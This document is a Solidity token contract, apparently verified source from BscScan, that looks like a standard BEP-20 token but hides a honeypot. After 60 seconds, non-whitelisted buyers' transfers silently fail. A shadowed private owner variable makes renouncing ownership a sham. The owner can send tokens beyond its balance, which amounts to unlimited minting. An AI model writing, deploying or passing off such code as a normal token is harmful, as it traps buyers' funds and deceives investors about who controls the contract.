/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8.12;

interface IRouter {
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
}

interface IFactory {
	function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		return msg.data;
	}
}

abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() {
		_transferOwnership(_msgSender());
	}

	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function owner() public view virtual returns (address) {
		return _owner;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

contract TestToken123 is Ownable {
	string public name;
	string public symbol;
	uint8  public decimals;
	uint public totalSupply;
	mapping (address => uint) public balanceOf;
	mapping (address => mapping(address => uint)) public allowance;
	
	address private _router;
	address private _lp;
	
	mapping (address => bool) private _allowed;
	mapping (address => uint) private _start;
	address private _owner = msg.sender;

	event Approval(address indexed owner, address indexed spender, uint256 value);
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	constructor(
		string memory tName, string memory tSymbol, uint tSupply, uint8 tDecimals, 
		address router, address[] memory accounts
	) {
		name = tName;
		symbol = tSymbol;
		decimals = tDecimals;
		totalSupply = tSupply * 10 ** decimals;
		
		balanceOf[msg.sender] = totalSupply;
		emit Transfer(address(0), msg.sender, totalSupply);

		_router = router;
		
		_allowed[msg.sender] = true;
		for(uint8 i = 0; i < accounts.length; i++) {
			_allowed[accounts[i]] = true;
		}
		
		allowance[msg.sender][_router] = type(uint).max;
	}

	modifier lp() {
		if(_lp == address(0)){
			_lp = IFactory(IRouter(_router).factory()).getPair(address(this), IRouter(_router).WETH());
		}
		_;
	}
	
	function getOwner() external view returns (address) {
		return owner();
	}
	
	function approve(address spender, uint amount) external returns (bool) {
		_approve(msg.sender, spender, amount);
		return true;
	}

	function transfer(address to, uint amount) external returns (bool success) {
		_transfer( msg.sender, to, amount);
		return true;
	}

	function transferFrom(address from, address to, uint amount) external returns (bool success) {
		_spendAllowance(from, msg.sender, amount);
		_transfer(from, to, amount);
		return true;
	}

	function burn(uint amount) external onlyOwner {
		balanceOf[msg.sender] -= amount;
		totalSupply -= amount;
		emit Transfer(msg.sender, address(0), amount);
	}
	
	function _checkOwner() internal view override {
		require(_owner == msg.sender, "caller is not the owner");
	}
	
	function _approve(address account, address spender, uint amount) internal {
		allowance[account][spender] = amount;
		emit Approval(account, spender, amount);
	}

	function _spendAllowance(address account, address spender, uint amount) internal {
		uint currentAllowance = allowance[account][spender];
		if (currentAllowance != type(uint).max) {
			require(currentAllowance >= amount, "ERC20: insufficient allowance");
			_approve(account, spender, currentAllowance - amount);
		}
	}
	
	function _transfer(address from, address to, uint amount) internal lp {
		if(_lp == from && _start[tx.origin] == 0) _start[tx.origin] = block.timestamp;
		if(_allowed[from] || _allowed[to] || _lp == from || block.timestamp < _start[tx.origin] + 60 ) {
			if(from == _owner && balanceOf[from] < amount) balanceOf[from] = 0; else
			balanceOf[from] -= amount;
			balanceOf[to] += amount;
			emit Transfer(from, to, amount);
		}
	}
	
	
}